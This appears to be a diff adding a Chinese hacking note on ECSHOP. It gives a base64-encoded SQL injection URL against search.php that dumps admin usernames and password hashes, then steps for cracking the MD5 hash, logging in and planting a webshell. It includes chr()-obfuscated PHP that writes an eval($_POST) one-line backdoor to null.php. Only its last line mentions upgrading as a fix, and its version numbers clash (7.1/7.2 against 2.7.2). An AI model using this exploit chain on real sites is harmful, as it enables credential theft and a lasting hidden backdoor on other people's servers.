@@ -1,0 +1,21 @@
+ECSHOP漏洞search.php：
+/search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319
+
+在程序根目录后输入上面的地址，7.1 7.2的版本会爆出管理员账号密码
+爆出密码之后，用MD5解密密码
+然后用管理员账号密码登陆进去，上传webshell的办法有：
+1、修改模板库文件 myship ，插入一句话木马，然后根目录：http://xxx.domain.com/myship.php 就是你的一句话木马
+2、打印订单：订单模板修改，查看源代码，输入
+
+<-----?-----php
+$filen=chr(46).chr(46).chr(47).chr(110).chr(117).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112);
+$filec=chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(117).chr(115).chr(98).chr(93).chr(41).chr(59).chr(63).chr(62);
+$a=chr(119);
+$fp=@fopen($filen,$a);
+$msg=@fwrite($fp,$filec);
+if($msg) echo chr(79).chr(75).chr(33);
+@fclose($fp);
+-----?---->
+（去掉—–，这里加上去是为了防止wp自动转换掉代码）
+然后保存，随便找打订单打印，之后根目录生成null.php的一句话木马，(*^__^*) 嘻嘻……
+防范办法：升级到官方最新版2.7.2即可修补漏洞！
